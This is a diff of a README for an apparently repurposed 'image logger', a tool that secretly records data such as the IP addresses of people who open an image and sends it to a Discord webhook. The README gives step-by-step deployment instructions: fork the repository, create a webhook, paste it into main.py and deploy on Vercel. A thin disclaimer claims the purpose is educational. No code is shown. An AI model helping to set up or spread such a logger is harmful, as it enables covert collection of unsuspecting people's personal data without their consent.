@@ -4,7 +4,7 @@
 so, what is this? this is an image logger which was originally made by DeKrypted (he's a genius like me by the way) but it didnt work no more and he got suspended so I just fixed it back for the ppl who want to know about this stuff. by the way i am not responsible for what you do with this nor am i purposfully promoting this to get people to use this with bad intentions. its only to show people how it works
 
 ### SIMPLE STEPS TO GET IT TO WORK:
-1. fork this
+1. fork this whole repository thing
 2. go in your discord server, go in the settings of a text channel, integrations, webhooks then make one. once you have made one click on it then u copy the webhook link.
 3. go in main.py then change the webhook thingy to the one you just copied.
 4. save everything then make an account in vercel then new project. import the one you forked from me then you're done i guess.
